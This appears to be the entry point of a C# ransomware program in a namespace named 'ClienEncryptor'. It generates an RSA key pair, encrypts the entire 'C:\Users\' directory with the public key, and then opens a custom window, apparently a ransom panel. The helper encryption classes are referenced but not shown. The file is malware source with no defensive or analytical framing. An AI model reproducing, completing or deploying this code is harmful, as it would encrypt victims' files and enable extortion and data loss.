using System.Windows.Forms;

namespace ClienEncryptor;

internal class Program
{
	private static void Main(string[] args)
	{
		EncryptionEngine.RSA.GenerateKeys(2048);
		EncryptionEngine.Encrypt_Dir("C:\\Users\\", EncryptionEngine.Keys.PublicKey);
		Application.Run((Form)(object)new Panel());
	}
}
